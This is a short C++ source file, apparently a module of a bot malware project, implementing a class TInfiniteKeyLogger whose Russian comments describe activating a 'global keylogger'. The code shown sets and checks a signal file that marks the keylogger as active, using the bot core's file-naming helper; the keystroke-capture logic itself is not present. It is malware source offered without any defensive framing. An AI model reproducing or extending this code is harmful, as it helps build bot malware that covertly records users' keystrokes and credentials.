//---------------------------------------------------------------------------

#pragma hdrstop

#include "KeyLogger.h"
#include "BotCore.h"
#include "StrConsts.h"
//---------------------------------------------------------------------------





TInfiniteKeyLogger::TInfiniteKeyLogger()
{

}
//----------------------------------------------------------------------------

TInfiniteKeyLogger::~TInfiniteKeyLogger()
{

}
//----------------------------------------------------------------------------

//--------------------------------------------
//  Функция возвращает имя сигнального файла
//  в котором будет храниться информация о
//  текущих настройках
//--------------------------------------------
string TInfiniteKeyLogger::GetSignalFileName()
{
	return Bot->MakeFileName(NULL, GetStr(EStrInfiniteKeyLoggerSignal).t_str());
}


//--------------------------------------------
//  Activate - Функция активирует глобальный
//             кейлогер
//--------------------------------------------
bool TInfiniteKeyLogger::Activate()
{
	string FN = GetSignalFileName();
	DWORD W = File::WriteBufferA(FN.t_str(), FN.t_str(), 2);
	return W == 2;
}
//----------------------------------------------------------------------------

//--------------------------------------------
//  Activated - Функция возвращает истину если
//             кейлогер активирован
//--------------------------------------------
bool TInfiniteKeyLogger::Activated()
{
	string FN = GetSignalFileName();
	return File::IsExists(FN.t_str());
}
//----------------------------------------------------------------------------
